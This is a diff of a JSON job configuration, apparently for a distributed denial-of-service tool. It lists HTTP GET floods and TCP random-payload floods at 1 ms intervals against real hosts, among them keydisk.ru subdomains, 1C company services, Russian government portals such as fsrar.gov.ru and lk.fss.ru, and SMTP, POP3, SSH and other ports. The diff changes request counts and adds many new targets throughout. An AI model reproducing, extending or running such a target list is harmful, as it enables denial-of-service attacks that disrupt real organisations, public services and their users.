@@ -1,7 +1,7 @@
 {
   "jobs": [{
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -16,7 +16,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -30,63 +30,61 @@
         }
       }
     }, {
-      "type": "tcp",
-      "count": 19,
-      "args": {
-        "address": "91.239.5.113:8092",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 19,
-      "args": {
-        "address": "31.13.60.76:25",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://report.keydisk.ru"
+          "path": "http://regservice.keydisk.ru"
         },
         "client": {
           "static_host": {
-            "addr": "31.13.60.76:80",
+            "addr": "91.239.5.113:8080",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://regservice.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.113:8091",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://regservice.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.113:8092",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 19,
+      "count": 9,
       "args": {
-        "address": "31.13.60.76:465",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 19,
-      "args": {
-        "address": "31.13.60.76:110",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 19,
-      "args": {
-        "address": "31.13.60.76:995",
+        "address": "91.239.5.113:10000",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -101,7 +99,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -116,7 +114,99 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://callback.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.113:8080",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://callback.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.113:8091",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://callback.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.113:8092",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "31.13.60.76:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://report.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "31.13.60.76:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "31.13.60.76:465",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "31.13.60.76:110",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "31.13.60.76:995",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -131,7 +221,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -146,7 +236,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -161,7 +251,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -176,7 +266,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -191,7 +281,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -206,7 +296,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -221,7 +311,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -236,7 +326,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -251,7 +341,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -266,7 +356,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -281,7 +371,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -296,7 +386,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -311,7 +401,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -326,7 +416,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -362,7 +452,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -377,7 +467,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -391,8 +481,16 @@
         }
       }
     }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "83.229.254.40:6080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -407,7 +505,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -422,7 +520,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -436,8 +534,16 @@
         }
       }
     }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "83.229.254.40:6080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -452,7 +558,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -467,7 +573,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -482,7 +588,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -497,7 +603,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -512,7 +618,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -527,7 +633,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -542,7 +648,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -557,7 +663,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -572,7 +678,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -587,7 +693,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -602,7 +708,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -617,7 +723,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -632,7 +738,7 @@
       }
     }, {
       "type": "http",
-      "count": 19,
+      "count": 9,
       "args": {
         "request": {
           "method": "GET",
@@ -641,6 +747,558 @@
         "client": {
           "static_host": {
             "addr": "89.108.121.3:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://redmine.keydisk.ru/login?back_url=http%3A%2F%2Fredmine.keydisk.ru%2F"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.28:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://redmine.keydisk.ru/login?back_url=http%3A%2F%2Fredmine.keydisk.ru%2F"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.28:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:902",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:3000",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:4434",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:8008",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:8222",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:8333",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "91.239.5.28:9922",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://nsqadmin.1c-edo.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.38:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://nsqadmin.1c-edo.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.38:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://invitations.1c-edo.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.38:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://invitations.1c-edo.keydisk.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.239.5.38:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://ufo.fsrar.gov.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.21:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://gibdd.fsrar.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.21:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://frap.fsrar.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.24:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://fsrar.gov.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.25:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://dfo.fsrar.gov.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.25:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://forum.fsrar.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.25:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://ca.fsrar.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.157:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://public.fsrar.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.95:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://public.fsrar.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "146.120.90.95:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://lk.fss.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.148.44.188:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://lk.fss.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.148.44.188:81",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://lk.fss.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.148.44.188:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://regservice.1c.ru/regservice/regservice.asmx?WSDL"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.152.27:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://regservice.1c.ru/regservice/regservice.asmx?WSDL"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.152.27:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://regservice.1c.ru/regservice/regservice.asmx"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.152.27:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://regservice.1c.ru/regservice/regservice.asmx"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.152.27:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://torg.1c.ru/equipment/onlayn-kassy/?utm_source=its&utm_medium=tmenu"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.155.12:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://torg.1c.ru/equipment/onlayn-kassy/?utm_source=its&utm_medium=tmenu"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.155.12:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://online.1c.ru/catalog/products"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.154.16:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://online.1c.ru/catalog/products"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.154.16:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://its.1c.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.155.120:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://its.1c.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.155.120:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://v8.1c.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.154.17:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://v8.1c.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.12.154.17:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 9,
+      "args": {
+        "address": "176.112.203.74:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://1c-report.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "176.112.203.74:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 9,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://1c-report.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "176.112.203.74:443",
             "is_tls": "true"
           }
         }
